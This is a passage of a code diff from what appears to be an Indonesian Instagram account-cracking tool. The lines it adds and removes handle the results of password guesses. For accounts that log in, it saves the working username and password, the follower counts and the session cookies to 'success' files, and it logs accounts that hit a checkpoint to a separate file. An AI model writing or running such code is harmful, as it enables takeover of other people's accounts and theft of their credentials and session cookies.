+				pengikut = x_jason["edge_followed_by"]["count"]
+				mengikut = x_jason["edge_follow"]["count"]
+				postingan = x_jason["edge_owner_to_timeline_media"]["count"]
+				cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
+				tree = Tree(Panel.fit(f"{H2}{username} {P2}| {H2}{pw}"))
+				tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
+				tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
+				tree.add(Panel.fit(f"{N2}{cookie}{P2}"))
+				prints(tree)
+				open(f"result/success-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
+				break
+			elif 'https://i.isntagram.com/challenge' in str(meledak_code):
 				Cp += 1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				print(f"                                                                ", end='\r')
-				time.sleep(0.10)
-				print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
-				print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
-				print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
-				print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
-				print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
-				open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
+				x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentApp(),"x-ig-app-id":'936619743392459'})
+				x_jason = x.json()["data"]["user"]
+				pengikut = x_jason["edge_followed_by"]["count"]
+				mengikut = x_jason["edge_follow"]["count"]
+				postingan = x_jason["edge_owner_to_timeline_media"]["count"]
+				tree = Tree("")
+				tree.add(Panel.fit(f"{K2}{username} {P2}| {K2}{pw}"))
+				tree.add(f"{P2}Followers : {K2}{pengikut}")
+				tree.add(f"{P2}Following : {K2}{mengikut}")
+				tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{ua}") 
+				prints(tree)
+				open(f"result/checkpoint-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
 				break
 			else:
 				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(20)
-	Loop += 1
+		Loop+=1
+	except requests.ConnectionError:
+		time.sleep(10)
 
 if __name__=='__main__':
 	menu()
